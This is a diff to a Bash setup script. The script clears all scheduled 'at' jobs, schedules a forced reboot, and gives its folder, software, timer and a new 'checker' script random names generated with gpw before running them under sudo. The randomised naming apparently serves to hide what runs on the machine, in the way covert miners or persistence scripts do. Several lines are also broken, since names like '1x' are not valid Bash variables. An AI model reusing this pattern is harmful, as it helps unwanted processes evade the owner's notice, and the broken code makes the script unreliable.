@@ -7,21 +7,22 @@ THREADS="$(nproc --all)"
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 echo 'sudo reboot -f' | at now + 12 hours
 
-apt -y install gpw
-apt -y install sudo
+apt-get -y install gpw
+apt-get -y install sudo
 
 
 
 timer=$(gpw 1 11)
-tmpfoldername=$(gpw 1 7)
-softwarename=$(gpw 1 9)
+tmpfoldername=$(gpw 1 10)
+softwarename=$(gpw 1 12)
+checker=$(gpw 1 8)
 
-1x=$(gpw 1 2)
-2x=$(gpw 1 4)
+1x=$(gpw 1 4)
+2x=$(gpw 1 5)
 3x=$(gpw 1 6)
-4x=$(gpw 1 8)
-5x=$(gpw 1 10)
-6x=$(gpw 1 12)
+4x=$(gpw 1 7)
+5x=$(gpw 1 8)
+6x=$(gpw 1 9)
 
 #rm -rf /tmp/defaultsoft/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
@@ -70,7 +71,10 @@ sudo mv /tmp/$tmpfoldername/defaulttimer.sh /tmp/$tmpfoldername/$timer.sh
 
 ##########################################################
 
+sudo sed -i "s/\<tmpfoldername\>/$tmpfoldername/g" /tmp/$tmpfoldername/defaultchecker.sh
+sudo sed -i "s/\<defaulttimer.sh\>/$timer.sh/g" /tmp/$tmpfoldername/defaultchecker.sh
 
+sudo mv /tmp/$tmpfoldername/defaultchecker.sh /tmp/$tmpfoldername/$checker
 
 ##########################################################
 
@@ -85,6 +89,6 @@ sudo dos2unix $3x.sh
 sudo dos2unix $6x.sh
 sudo dos2unix $1x.sh
 
-sudo ./$timer.sh & ./defaultchecker.sh
+sudo ./$timer.sh && sudo ./$checker.sh
 
 
